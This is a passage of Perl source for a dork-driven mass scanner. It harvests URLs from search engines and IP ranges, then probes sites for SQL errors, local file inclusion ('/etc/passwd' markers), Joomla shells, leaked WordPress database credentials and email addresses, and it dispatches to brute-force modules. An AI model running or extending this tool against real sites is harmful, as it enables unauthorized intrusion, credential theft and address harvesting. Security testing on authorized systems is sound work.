    print "\033[0;36m$mlevel \n";
  }
  if (defined $command){
    print "\033[1;33m[:] EXTERN CMD:: ";
    print "\033[0;36m/External Command\n";
  }
  if (defined $output) {
    print "\033[1;33m[:] OUTPUT:: ";
    print "\033[0;36m$outdir/\n";
  }
  if (defined $checkVersion) {
    print "\033[1;33m[:] TASK:: ";
    print "\033[0;36m/Update Version\n";
  }
  if ((defined $noinfo) || (defined $beep)) {
    print "\033[1;33m[:] EXTRA:: ";
	if (defined $noinfo) {
      print "\033[0;36m/No extra info ";
	}
	if (defined $beep) {
      print "\033[0;36m/Beep Sound ";
	}
    print "\n";
  }
  if (!defined $mlevel) {
	finInfoMenu();
	testConection();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## BUILD DORK LIST
sub dorkList {
  my $checkDorkList = $Bin."/aTdorks.txt";
  if (-e $checkDorkList){ unlink $checkDorkList};
  if (defined $dork){
	if (substr($dork, -4) eq '.txt') {
	  use File::Copy qw(copy);
	  copy $dork, $Bin.'/aTdorks.txt';
    }else{
      if ($dork =~ m/,/) {
        $dork =~ s/,/ /g;
      }elsif ($dork =~ m/ /) {
        $dork =~ s/ /+/g;
	  }
      my @dorks = split / /, $dork;  
      foreach my $dork (@dorks) {
        open (FILE, '>>'.$Bin.'/aTdorks.txt');
        print FILE "$dork\n";
        close (FILE);
      }
	}
  }elsif (defined $rangip) {
    if (($rangip =~ /(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/) && ($1<=255 && $2<=255 && $3<=255 && $4<=255 && $5<=255 && $6<=255 && $7<=255 && $8<=255)) { 
      my $startIp = $1.".".$2.".".$3.".".$4;
      my $endIp = $5.".".$6.".".$7.".".$8;
      my (@ip,@newIp,$i,$newIp,$j,$k,$l);
      open (FILE, '>>'.$Bin.'/aTdorks.txt');
      @ip = split(/\./,$startIp);
      for($i=$ip[0];$i<=$5;$i++) {
	    $ip[0]=0 if($i == $5);
        for($j=$ip[1];$j<=$6;$j++) {
          $ip[1]=0 if($j == $6);
          for($k=$ip[2];$k<=$7;$k++) {
            $ip[2]=0 if($k == $7);
            for($l=$ip[3];$l<=$8;$l++) {
              $ip[3]=0 if($l == $8);
              @newIp = $newIp = join('.',$i,$j,$k,$l);
              print FILE "$newIp \n";
            }
	      }
		}
      }
	  close (FILE);
	}else{
	  finInfoMenu();
      print "\033[0;31m[!] $rangip is not a valid range! [Ex: --rang 15.24.123.142-142.11.10.101]\n";
      exit();
	}
  }elsif (defined $Target){
	if (-e '$Bin/aTdorks.txt'){ unlink '$Bin/aTdorks.txt'};
	if (substr($Target, -4) eq '.txt') {
	  use File::Copy qw(copy);
	  copy $Target, $Bin.'/aTdorks.txt';
    }else{
      if ($Target =~ m/,/) {
        $Target =~ s/,/ /g;
      }elsif ($Target =~ m/ /) {
        $Target =~ s/ /+/g;
	  }
      my @targets = split / /, $Target;
      foreach my $Target (@targets) {
        open (FILE, '>'.$Bin.'/aTdorks.txt');
        print FILE "$Target\n";
        close (FILE);
	  }
    }
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## CHECK IF NEEDED TARGET LIST
sub ifGetTargetList {
  if ((!defined $mlevel) && (!defined $validText) && (!defined $misup)){
    targetList();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## BUILD TARGET LIST
sub targetList {
  my $checkDorkList = $Bin."/aTsearch.txt";
  if (-e $checkDorkList){ unlink $checkDorkList};
  if (defined $rangip) {
    if (($rangip =~ /(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/) && ($1<=255 && $2<=255 && $3<=255 && $4<=255 && $5<=255 && $6<=255 && $7<=255 && $8<=255)) { 
      my $startIp = $1.".".$2.".".$3.".".$4;
      my $endIp = $5.".".$6.".".$7.".".$8;
      my (@ip,@newIp,$i,$newIp,$j,$k,$l);
      open (FILE, '>>'.$Bin.'/aTsearch.txt');
      @ip = split(/\./,$startIp);
      for($i=$ip[0];$i<=$5;$i++) {
	    $ip[0]=0 if($i == $5);
        for($j=$ip[1];$j<=$6;$j++) {
          $ip[1]=0 if($j == $6);
          for($k=$ip[2];$k<=$7;$k++) {
            $ip[2]=0 if($k == $7);
            for($l=$ip[3];$l<=$8;$l++) {
              $ip[3]=0 if($l == $8);
              @newIp = $newIp = join('.',$i,$j,$k,$l);
              print FILE "$newIp \n";
            }
          }
	    }
      }
	  close (FILE);
	}else{
	  finInfoMenu();
      print "\033[0;31m[!] $rangip is not a valid range! [Ex: --rang 15.24.123.142-142.11.10.101]\n";
      exit();
	}
  }elsif (defined $Target) {
	if (substr($Target, -4) eq '.txt') {
	  use File::Copy qw(copy);
	  copy $Target, $Bin.'/aTsearch.txt';
    }else{
      if ($Target =~ m/,/) {
        $Target =~ s/,/ /g;
      }elsif ($Target =~ m/ /) {
        $Target =~ s/ /+/g;
	  }
      my @targets = split / /, $Target;
      foreach my $Target (@targets) {
        open (FILE, '>'.$Bin.'/aTsearch.txt');
        print FILE "$Target\n";
        close (FILE);
	  }
    }
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## CHECK TARGET URL OR IP
sub checkUrlType{
  my $URL=$_[0];
  if ($URL=~m/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/ && ($1<=255 && $2<=255 && $3<=255 && $4<=255 )){
	finInfoMenu();
    print "\033[0;31m[!] $URL is an IP [Use!: -t <ip> --level 20 <opcion>]! \n";
    exit();
  }else{
    return $URL;
  }
}	
############################################################################################################################################################################################
############################################################################################################################################################################################
## VALIDATE IP
sub checkIp{
  my $URL=$_[0];
  if ($URL!~m/^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})/ && ($1<=255 && $2<=255 && $3<=255 && $4<=255 )){
	finInfoMenu();
    print "\033[0;31m[!] $URL is an IP [Use: -t <ip> --level 20 <opcion>]! \n";
    exit();
  }else{
    return $URL;
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## COUNT PROXIES IN LIST
sub countProxies {
  my $lc3 = 0;
  my $file = $_[0];
  open my $fh, "<", $file;
  $lc3++ while <$fh>;
  my $prx;
  if ($lc3>1){$prx="Proxies";}else{$prx="Proxy";}
  print "\033[0;36m[$lc3 $prx found!]";
  close $fh;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## COUNT DORKS IN LIST
sub countDorks {
  my $lc = 0;
  my $file3 = $_[0];
  open my $fh, "<", $file3;
  $lc++ while <$fh>;
  print "\033[0;36m[$lc Dorks(s) Found in the List!]\n";
  close $fh;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## COUNT SCAN LISTS
sub countLists {
  my $lc = 0;
  my $file = $_[0];
  open my $fh, "<", $file;
  $lc++ while <$fh>;
  print $lc;
  close $fh;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## COUNT SCAN LISTS
sub countResultLists {
  my $lc2 = 0;
  my $file2 = $Bin.'/aTscan.txt';
  open my $fh, "<", $file2;
  $lc2++ while <$fh>;
  print "\033[1;37m[ ] -----------------------------------------------------------------------\n";
  print "\033[0;32m[!] $lc2 Target(s) Found!\n";
  close $fh;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## VERIFY TARGETS FOR EXPLOITATION
sub control {
  my $URL=$_[0];
  if (defined $mdom) {
    $URL = removeProtocol($URL);
	$URL =~ s/\/.*//s;
  }
  if ((defined $replace) && (defined $with)) {
	 if (index($URL, $replace) != -1) {
	    $URL =~ s/$replace/$with/ig;
	 }
  }
  $URL=checkUrlSchema($URL);	
  return $URL;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## EXTRACT RESULTS FOR EXTERNAL PROCESS
sub resultsTOcommand {
  if (defined $command) {
    unlink $Bin.'/aTsearch.txt';
    use File::Copy qw(copy);
	copy $Bin.'/aTscan.txt', $Bin.'/aTsearch.txt';
  }  
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## EXTRAT INFO PROCESS SCAN
sub checkExtraInfo {
  my $URL1=$_[0];
  my %replace = (
    'http://' => '',
    'https://' => '',
  );
  $URL1=~ s/$_/$replace{$_}/g for keys %replace;
  $URL1=~ s/\/.*//s;
  use Socket;
  my $ip = inet_aton($URL1);
  print "\033[1;37m    IP:     ";
  if ($ip) { 
    my $address = inet_ntoa($ip);
	print "\033[0;37m$address\n";
  }else{
	print "\033[0;37mUndefined!\n";
  }
  if ((defined $replace) && (defined $with)) {
	print "\033[1;37m    REPLC:  ";
	print "\033[0;37m[$replace] => [$with]\n";
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## GET SCAN YES REGEX
sub scanRegexYes {
  my $yes;
  if (defined $validText) {$yes = $validText;}
  elsif (defined $xss) {$yes = 'MySQL|syntax|SQL|mysql_fetch_assoc|num_rows|ORA-01756|PostgreSQL|internal server error|You have an error in your SQL syntax';  }
  elsif (defined $lfi) {$yes = 'root:x|bin:x|nologin';}
  elsif (defined $JoomRfi) {$yes = 'r57shell|safe_mode|Executed|Shell';}
  elsif (defined $WpAfd) {$yes = 'DB_NAME|DB_USER|DB_PASSWORD';}
  elsif (defined $eMails) {$yes = '((([A-Za-z0-9]+_+)|([A-Za-z0-9]+\-+)|([A-Za-z0-9]+\.+)|([A-Za-z0-9]+\++))*[A-Za-z0-9]+@((\w+\-+)|(\w+\.))*\w{1,63}\.[a-zA-Z]{2,6})';}
  else{$yes = '';}
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## GET SCAN NO REGEX
sub scanRegexNo {
  my $no;
  if ((defined $misup) || (defined $validText) || (defined $xss) || (defined $lfi) || (defined $WpAfd) || (defined $adminPage) || (defined $WpSites) || (defined $JoomSites) || (defined $eMails)) {
  $no = 'not found|404|not exist|ErrorDocument|Forbidden|The page you requested couldn\'t be found';}
  else{$no="z92qxx1e12k34569me3effw12k34569mfff512k12k34569m34569mn87";}
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## GET SCAN EMAILS
sub scanEmails {
  my $cmails;
  if (defined $cmails) {$cmails=$1;}
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## ASK FOR CONTINUE WHEN POSITIVE RESULT FOUND
sub ifContinue {
  my $URL1=$_[0];
  print "\033[0;32m$URL1\n";
  print "\033[0;33m    [!] Possible positive result! Do you want to continue scan? [Y/n]: ";
  my $resp=<STDIN>;
  chomp ($resp);
  my $yes ='Y|y|yes|YES|Yes';
  if ($resp !~ /$yes/) {
    countResultLists();
    if (defined $output) {
	  output($output);
	}
    print "\033[0;37m[ ]------------------------------------------------------------------------\n";
    subfin();
	resultsTOcommand();
	unlink $Bin.'/aTscan.txt';
	unlink $Bin.'/aTsearch.txt';
	unlink $Bin.'/aTdorks.txt';
	exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## BUILT POSITIVE SCAN RESULTS LIST
sub saveme {
  my $URL1=$_[0];
  if (defined $beep) {print chr(7);}
  print "\033[0;32m$URL1 \n";
  open (LOS, '>>', $Bin.'/aTscan.txt');
  print LOS "$URL1\n";
  close (LOS);
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## OUTPUT CONFIG
sub output {
  $output=$_[0];
  my $listme = $Bin.'/aTscan.txt';
  my $save = "$outdir/$output";
  if (-e $save) {unlink $save;}
  use File::Copy qw(copy);
  copy $listme, $save;
  print "\033[0;32m[!] Results saved in $save!\n";  
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## SCAN PROCEDURE
sub checkedUrl {
  my $URL1=$_[0];
  my $yes=scanRegexYes();
  my $no=scanRegexNo();
  my $cmails=scanEmails();
  if (defined $random) {newIdentity();}
  my $request = HTTP::Request->new('GET', $URL1);
  my $response = $ua->request($request);
  my $html = $response->content;
  my $status = $response->code;
  my $serverheader = $response->server;
  my $httpd = $response->headers_as_string;
  if (!defined $noinfo) {
    checkExtraInfo($URL1);
    if($URL1 !~ /https?:\/\//) { $URL1 = "http://$URL1"; };	
    print "\033[1;37m    HTTP:   ";
    print "\033[0;37mHTTP/1.1 $status\n";
    print "\033[1;37m    SERVER: ";
    if (defined $serverheader) {
      print "\033[0;37m$serverheader \n";
    }else{
	  print "\033[0;37mUndefined\n";
    } 
    getErrors($html);
  }
  print "\033[1;37m    SCAN:   ";
  if (defined $misup and $status=="200") {
    saveme($URL1);
  }elsif (($html =~ /$yes/) && ($html !~ /$no/)) {
    if ((defined $validText) || (defined $xss)) {
	  saveme($URL1);
	}else{
	  if ($response->is_success and !$response->previous) {
        if (defined $beep) {print chr(7);}
		if ((defined $adminPage) || (defined $lfi) || (defined $JoomRfi) || (defined $WpAfd)) {
		  ifContinue($URL1);
		}elsif (defined $eMails) {
          print "\033[0;32m$1\n";
          open (INFO, '>>', $Bin.'/aTscan.txt');
          print INFO "$1\n";
          close (INFO);
          open (LOG, '>>', $Bin.'/aTmails.txt');
          print LOG "$URL1\n   $1\n";
		  close (LOG);
	    }else{
          print "\033[0;32m$URL1\n";
          saveme($URL1);
	    }
	  }
	}
  }else{
	print "\033[0;31mNo Results Found! \n";
  }
  print "\033[0;37m    ....................................................................... \n";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## CHECK ERRORS
sub checkErrorType { 
  print "\033[1;37m    ERROR:  ";
    my $ERROR1=$_[0];
    for my $ERROR (@ERROR) {
  	if ($ERROR1 eq $ERROR){
	  if (defined $beep) {print chr(7);}
      if ($ERROR eq $ERROR[0]){
	    print "\033[0;33mPossible Lfi Vulnerability!\n";
      }else{
	    print "\033[0;33m$ERROR\n";
	  }
	}  
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## CHECK URL PARTS
sub checkUrlSchema {
  my $URL=$_[0];
  if ($URL !~ /https?:\/\//) { $URL = "http://$URL"; };
  return $URL;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## DELETE SEARCH + EXPLOITS LIST
sub deleteqexp { 
  unlink $Bin.'/aTsearch.txt';
  unlink $Bin.'/aTexploits.txt';
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## DEFINE CMS DETECTION
sub checkCmsType {
  my $MODULETYPE1=$_[0];
  print "\033[1;37m    CMS:    ";
    for my $MODULETYPE (@MODULETYPE) {
  	if ($MODULETYPE1 eq $MODULETYPE){
      if (($MODULETYPE eq $MODULETYPE[0])  || ($MODULETYPE eq $MODULETYPE[1])){ print "\033[0;33mWordPress\n";
      }elsif (($MODULETYPE eq $MODULETYPE[2]) || ($MODULETYPE eq $MODULETYPE[3])) { print "\033[0;33mJoomla\n";
      }elsif ($MODULETYPE eq $MODULETYPE[4]){ print "\033[0;33mTextpattern\n";
      }elsif ($MODULETYPE eq $MODULETYPE[5]){ print "\033[0;33mSMF\n";
      }elsif ($MODULETYPE eq $MODULETYPE[6]){ print "\033[0;33mphpBB\n";
      }elsif (($MODULETYPE eq $MODULETYPE[7]) || ($MODULETYPE eq $MODULETYPE[8])){ print "\033[0;33mvBulletin\n";
      }elsif ($MODULETYPE eq $MODULETYPE[9]){ print "\033[0;33mMyBB\n";
      }elsif (($MODULETYPE eq $MODULETYPE[10]) || ($MODULETYPE eq $MODULETYPE[11])) { print "\033[0;33mCloudFlare\n";
      }elsif ($MODULETYPE eq $MODULETYPE[12]){ print "\033[0;33mDrupal\n";
      }elsif ($MODULETYPE eq $MODULETYPE[13]){ print "\033[0;33mPostNuke\n";
      }elsif ($MODULETYPE eq $MODULETYPE[14]){ print "\033[0;33mATutor\n";
      }elsif ($MODULETYPE eq $MODULETYPE[15]){ print "\033[0;33mPHP-Nuke\n";
      }elsif (($MODULETYPE eq $MODULETYPE[16]) || ($MODULETYPE eq $MODULETYPE[17])){ print "\033[0;33mMoodle\n";
      }elsif ($MODULETYPE eq $MODULETYPE[18]){ print "\033[0;33mAdaptCMS\n";
      }elsif ($MODULETYPE eq $MODULETYPE[19]){ print "\033[0;33mSilverStripe\n";
      }elsif ($MODULETYPE eq $MODULETYPE[20]){ print "\033[0;33mMODx\n";
      }elsif ($MODULETYPE eq $MODULETYPE[21]){ print "\033[0;33mXOOPS\n";
      }elsif (($MODULETYPE eq $MODULETYPE[22]) || ($MODULETYPE eq $MODULETYPE[23])) { print "\033[0;33mOsCommerce\n";
      }elsif (($MODULETYPE eq $MODULETYPE[24]) || ($MODULETYPE eq $MODULETYPE[25])) { print "\033[0;33mPrestaShop\n";
      }elsif ($MODULETYPE eq $MODULETYPE[26]){ print "\033[0;33mb2evolution\n";
      }elsif (($MODULETYPE eq $MODULETYPE[27]) || ($MODULETYPE eq $MODULETYPE[28])) { print "\033[0;33mMagento\n";
      }elsif (($MODULETYPE eq $MODULETYPE[29]) || ($MODULETYPE eq $MODULETYPE[30])) { print "\033[0;33mZen Cart\n";
      }elsif (($MODULETYPE eq $MODULETYPE[31]) || ($MODULETYPE eq $MODULETYPE[32])) { print "\033[0;33mConcrete5\n";
      }elsif ($MODULETYPE eq $MODULETYPE[33]){ print "\033[0;33mOpenCart\n";}
	}
  }	 
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## END COUNT SCAN RESULTS
sub finContinueModule {
  my $lc = 0;
  open my $file, "<", $Bin."/aTscan.txt";
  $lc++ while <$file>;
  print "\033[0;37m[ ]------------------------------------------------------------------------\n";
  print "\033[0;32m[!] $lc Target(s) Found!\n";
  close $file;
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## NEGATIVE SCAN AND EXIT
sub negativeExit {
  negative2();
  exit();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## RETURN NEGATIVE SCAN
sub negative {
  print "\033[0;37m[ ]------------------------------------------------------------------------\n";
  print "\033[0;31m[!] No Results Found!\n";
  subfin();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## RETURN NEGATIVE SCAN2
sub negative2 {	
  print "\033[0;37m[ ]------------------------------------------------------------------------\n";
  print "\033[0;31m[!] No Results Found!\n";
  subfin();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## END SCAN PROCESS
sub subfin {
  print "\033[0;31m[!] ";
  timer();
  print "SCAN FINISHED!\n";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## CHECK TARGETS LIST
sub searchexitstargets {
  if (!-e $Bin.'/aTsearch.txt'){
    finInfoMenu();
    print "\033[0;31m[!] No Target list found!\n";
	exit();
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub validateUrl {
  if (!defined $mlevel) {
    my $printarget=$_[0];
    if ($printarget!~ /\b((?=[a-z0-9-]{1,63}\.)[a-z0-9]+(-[a-z0-9]+)*\.)+[a-z]{2,63}\b/) {
      $printarget='checkednovalidurl';
    }
	return $printarget;
  }
}
############################################################################################################################################################################################
############################################################################################################################################################################################
sub adviseUrl {
  print "    \033[1;37mSCAN:  \033[0;31mError!! Not a Valid Url!\n";
  print "    \033[0;37m.......................................................................\n";
  print "    \033[0;37m[ ] -------------------------------------------------------------------\n";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## DESCLAIMER
sub desclaimer {
  print "\033[1;37m[+]-----------------------------------------------------------------------[+]\n\033[1;37m[:]";
  print "\033[0;37m-----------------------------------------------------------------------\033[1;37m[:]\n\033[1;37m[:]";
  print "\033[0;37m This is a pentest tool! We will not be responsible or liable directly \033[1;37m[:]\n\033[1;37m[:]";  
  print "\033[0;37m      or indirectly in any way for any loss or damage of any kind      \033[1;37m[:]\n\033[1;37m[:]";
  print "\033[0;37m              incurred as result of our program use !!                 \033[1;37m[:]\n";               
  print "\033[1;37m[:]\033[0;37m-----------------------------------------------------------------------\033[1;37m[:]\n";
  print "\033[1;37m[:]-----------------------------------------------------------------------[:]\n";
  sleep(2);
  osinfo();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## SCAN MODULE HEADER
sub headerScan {
  ifGetTargetList();
  searchexitstargets();
  scanTitleBgn();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## BGN SCAN TITLE
sub scanTitleBgn {
  print "\033[1;37m[!] ";
  timer();
  print "::: STARTING ";
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## END SCAN TITLE
sub scanTitleEnd {
  print "\033[1;37m SCAN :::\n";
  forwait();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## END SCAN NO MORE PROCESS
sub adios {
  if (defined $output) {
    output($output);
  }
  subfin();
  deleteqexp();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## SCAN HTML FOR ERRORS
sub getErrors { 
  my $html=$_[0];
  for my $ERROR (@ERROR) {
	if ( $html =~ /$ERROR/ ){
	  my $ERROR1=$ERROR;
	  checkErrorType($ERROR1);
	}
  }
  for my $MODULETYPE (@MODULETYPE) {
	if ( $html =~ /$MODULETYPE/ ){
	  my $MODULETYPE1=$MODULETYPE;
	  checkCmsType($MODULETYPE1);
	}
  }		          
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## SEARCH ENGINE
sub submsearch {
  my $checksearchscanlist = $Bin."/aTsearch.txt";
  if (-e $checksearchscanlist){ unlink $checksearchscanlist};
  dorkList($dork);
  msearch();
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## ENGINE PROCEDURE
sub msearch {
  scanDetail();
  print "\033[1;33m[:] RANDOM SEARCH:: ";
  print "\033[0;36m";
  if (defined $motor) {
    if (($motor !~/all/) &&($motor !~/bing/)&&($motor !~/google/) && ($motor !~/ask/)) {print "DEFAULT BING [$browserLang] ";}
    else{ if ($motor =~/bing/) { print "BING [$browserLang] ";}
    if ($motor =~/google/) {print "GOOGLE [$googleDomain] ";}
    if ($motor =~/ask/) {print "ASK [com]";}
    if ($motor =~/all/) {print "BING [$browserLang] GOOGLE [$googleDomain] ASK [com]";}
    }
  }else{
    print "DEFAULT BING [$browserLang] ";
  }
  
  if (defined $unique) {
    print "\033[0;36m[Unique Results]";
  }
  if (defined $ifinurl) {
    print "\033[0;36m[Ifinurl VLD]";
  }
  print "\n";  
  if (defined $dork) {
    my $printdork = $dork;
	$printdork =~ s/\+/ /g;
    print "\033[1;33m[:] DORK:: ";
    print "\033[0;36m[$printdork]";
    my $pattern = '.txt';
	if ($dork =~ m/$pattern/i){
	  countDorks($dork);
	}else{
      print "\n";
	}
  }
  finInfoMenu();
  testConection();
  scanTitleBgn();
  print "\033[1;37mENGINE";
  scanTitleEnd();
  my $count=0;
  open (FILE, $Bin."/aTdorks.txt");
  while ($dork = <FILE>) {
    chomp $dork;
	$count++;
	if ((defined $Target) || (defined $rangip)) {
      $dork = "ip%3A".$dork;
	}
	$dork =~ s/^\s+//;
	if ((!defined $xss) && (!defined $exploit) && (!defined $lfi) && (!defined $command) && (!defined $misup) && (!defined $validText) && (!defined $adminPage) && (!defined $subdomain) && (!defined $JoomRfi) && (!defined $WpAfd) && (!defined $mports) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $eMails) && (!defined $WpBf) && (!defined $joomBf)) {
      print "\033[0;36m\n[!] ";
	  timer();
	  print "[Dork $count/";
	  my $file=$Bin."/aTdorks.txt";
	  countLists($file);
      my $printdork = $dork;
	  $printdork =~ s/\+/ /g;
	  print "\033[0;36m][$printdork]\n";
      print "\033[1;37m    ....................................................................... \n";
    }
    my $motor1="http://www.bing.com/search?q=MYDORK&first=MYNPAGES&FORM=PERE&cc=MYBROWSERLANG";
    my $motor2="http://www.google.MYGOOGLEDOMAINE/search?q=MYDORK&start=MYNPAGES";
    my $motor3="http://www.ask.com/web?q=MYDORK&page=MYNPAGES&qid=MYID";
    open (MOTORS, '>'.$Bin.'/aTmotors.txt');
    my $motorparam="bing|google|ask|all";
    if (defined $motor) {    
      if ($motor !~ m/$motorparam/) {
        print MOTORS "$motor1";
      }else{
        if (($motor=~/all/) || (($motor=~/bing/) && ($motor=~/google/) && ($motor=~/ask/))) {
          print MOTORS "$motor1\n$motor2\n$motor3\n";
        }else{
          if ($motor=~/bing/) {
            print MOTORS "$motor1\n";
          }
          if ($motor=~/google/) {
            print MOTORS "$motor2\n";
          }
          if ($motor=~/ask/) {
            print MOTORS "$motor3\n";
          }
        }
      }
    }else{
      print MOTORS "$motor1\n";
    }
    close(MOTORS);
    my @scanlist=&scan();
    sub scan(){
      my @search;
	  my $mlevel = $mlevel+=-10 if $mlevel > 9;
	  my $npages;	        
      for($npages=0;$npages<=$mlevel;$npages+=10){
        open (MOTOR, $Bin.'/aTmotors.txt');
        while (my $motor = <MOTOR>) {
	      chomp $motor;
          $motor=~ s/MYDORK/$dork/g;
          $motor=~ s/MYBROWSERLANG/$browserLang/g;
          $motor=~ s/MYGOOGLEDOMAINE/$googleDomain/g;
          $motor=~ s/MYID/$Id/g;
          $motor=~ s/MYNPAGES/$npages/g;
          my $search=$ua->get("$motor");
          $search->as_string;
          my $Res=$search->content;
		  while($Res =~ m/((https?|ftps?):\/\/([^>\"\<\'\#\@\~\\!\(\)\s]*))/g){
          #while($Res =~ m/.*?href="([^"]*)/){
		    my $URL=$1;
            if (defined $motor and $motor=~/google/) {
              $URL=~s/\&.*//s;
            }            
            $URL =~ s/%([0-9A-Fa-f]{2})/chr(hex($1))/eg;
		    $URL = uri_unescape($URL);
		    $URL = decode_entities($URL);
            if ($URL !~ /$nolisting/) {
		      my $check = $dork;
			  my $pat2 = 'inurl:|intitle:|intext:|allinurl:|index\+of\+';
              if (defined $unique) {
			    $check = $dork;
			    $check =~ s/:\+/:/g;
			    $check =~ s/$pat2//g;
	          }elsif (defined $ifinurl) {
		        $check=$ifinurl;
	          }elsif ((defined $WpAfd) || (defined $WpSites)) {
		        $check="\/wp-content\/";
			  }elsif ((defined $JoomRfi) || (defined $JoomSites)) {
			    $check="\/index.php?option=com_";
	          }else{
		        $check='.';
		      }
           	  if (index($URL, $check) != -1) {
			    my $URL=$URL;
			    if ($URL=~ /\b((?=[a-z0-9-]{1,63}\.)[a-z0-9]+(-[a-z0-9]+)*\.)+[a-z]{2,63}\b/) {
			      if ((defined $msites) || (defined $mdom)) {
				    $URL = removeProtocol($URL);
                    $URL=~s/\/.*//s;
			        $URL=checkUrlSchema($URL);
			      }
                  open (TEXT, '>>', $Bin.'/aTsearch.txt');
			      print TEXT "$URL\n";
                  close (TEXT);
			    }
              }
			}
          }
		}
        close (MOTOR); 
      }
    }
  }
  close (FILE); 
  my $list = $Bin."/aTsearch.txt";
  if (-e $list){
    my $lc = 0;
	my $file = $Bin."/aTsearch.txt";
    my %seen = ();
    {
      local @ARGV = ($file);
      local $^I = '.bac';
      while(<>){
        $seen{$_}++;
        next if $seen{$_} > 1;
        print;
        close (TEXT);
		unlink $Bin."/aTsearch.txt.bac";
      }
    }   
    my $count2=0; 
    open (URL, $Bin.'/aTsearch.txt');
    while (my $URL = <URL>) {
	  chomp $URL;                  
	  $count2++;
	  my $URL=checkUrlSchema($URL);			 
	  if ((!defined $xss) && (!defined $exploit) && (!defined $lfi) && (!defined $misup) && (!defined $validText) && (!defined $adminPage) && (!defined $subdomain) && (!defined $JoomRfi) && (!defined $WpAfd) && (!defined $mports) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $eMails) && (!defined $WpBf) && (!defined $joomBf)) {				    
	    print "\033[1;33m    ";
	    timer();
	    print "[Target $count2]\n";
	    print "\033[1;37m    TARGET: ";
        if (defined $beep) {print chr(7);}
		print "\033[0;32m$URL\n";
	    my $URL1=$URL;
        if (!defined $noinfo) {
          checkExtraInfo($URL1);
		  my $request = HTTP::Request->new('GET', $URL1);
          my $response = $ua->request($request);
          my $html = $response->content;
          my $status = $response->code;
		  my $serverheader = $response->server;
          print "\033[1;37m    HTTP:   ";
	      print "\033[0;37mHTTP/1.1 $status\n";
          print "\033[1;37m    SERVER: ";
          if (defined $serverheader) {
            print "\033[0;37m$serverheader\n";
          }else{
            print "\033[0;37mUndefined\n";
          }
          getErrors($html);
        }
		print "    \033[0;37m[ ] -------------------------------------------------------------------\n";
	  }
   	}
    close (URL);
    print "\033[0;37m[ ]------------------------------------------------------------------------\n";
	print "\033[0;32m[!]";
    my $lcs = 0;
    my $files = $Bin.'/aTsearch.txt';
    open my $fh, "<", $files;
    $lcs++ while <$fh>;
    print " $lcs ";
    close $fh;
	print "Unique Result(s) Found!\n";     
	if ((!defined $xss) && (!defined $exploit) && (!defined $lfi) && (!defined $misup) && (!defined $validText) && (!defined $adminPage) && (!defined $subdomain) && (!defined $JoomRfi) && (!defined $WpAfd) && (!defined $mports) && (!defined $mupload) && (!defined $mzip) && (!defined $command) && (!defined $eMails) && (!defined $WpBf) && (!defined $joomBf)) {
	  if (defined $output) {
	    my $listme = $Bin."/aTsearch.txt";
		my $save = "$outdir/$output";
		if (-e $save) {unlink $save;}
        use File::Copy qw(copy);
	    copy $listme, $save;
        print "\033[0;32m[!] Results saved in $save\n";
      }
	  unlink $Bin.'/aTsearch.txt';
      subfin();
    }
	if (-e $Bin.'/aTscan.txt'){ unlink $Bin.'/aTscan.txt'};
  }else{
    negative();
	exit();
  }
  unlink $Bin.'/aTdorks.txt';
  unlink $Bin.'/aTmotors.txt';
  if (defined $misup) {misup();}
  if (defined $validText) { validation();}
  if (defined $xss) {xss();}
  if (defined $lfi) { lfi();}
  if (defined $JoomRfi) { JoomRfi();}
  if (defined $WpAfd) { WpAfd();}
  if (defined $adminPage) { adminPage();}
  if (defined $subdomain) { subdomain();}
  if (defined $mupload) { uploadSites();}
  if (defined $mzip) { zipSites();}
  if (defined $eMails) { eMails();}
  if (defined $WpBf) { BFmwpsites();}
  if (defined $joomBf) { BFmjoomsites();}
  if (defined $command) {mcommand();}
}
############################################################################################################################################################################################
############################################################################################################################################################################################
## VALIDATION IF STATUS 200
sub misup {
  if (-e $Bin.'/aTscan.txt'){ unlink $Bin.'/aTscan.txt';}
  if (-e $Bin.'/validated.txt'){ unlink $Bin.'/validated.txt';}
  if (!defined $mlevel){
    targetList();
  }
  searchexitstargets();
  scanTitleBgn();
  print "\033[1;37mHTTP VALIDATION";
